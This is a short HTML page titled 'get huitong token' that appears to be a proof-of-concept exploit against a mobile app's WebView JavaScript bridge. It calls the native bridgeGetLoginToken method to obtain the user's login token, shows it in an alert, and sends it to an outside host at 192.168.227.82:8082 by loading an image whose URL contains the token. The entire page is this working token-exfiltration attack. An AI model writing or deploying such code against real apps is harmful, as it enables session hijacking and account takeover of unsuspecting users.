<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>get huitong token</title>
</head>
<body>

<script>
var interval_ret = 0;
function gotowhite(){
	window.location.href="https://tourmet-icsl.hwht.com/webapp/#/tourmet/home";
}

function getinfo() {
	if(interval_ret > 0){
		if(window.nativeCB){
			window.nativeCB.bridgeGetLoginToken();
			//alert("native is: " + window.nativeCB)
		}else{
			document.write('no nativeCB object in this document.')
		}
    	}
}

function loginTokenCallback(token) {
	alert('token is' + token);
        document.body.appendChild(document.createElement("img")).src = "http://192.168.227.82:8082/huitong/" + token;   
	document.write('token is: ' + token)
}
	
	
interval_ret = setInterval(gotowhite(),10);
setTimeout(getinfo(),1000)


</script>
</body>
</html>
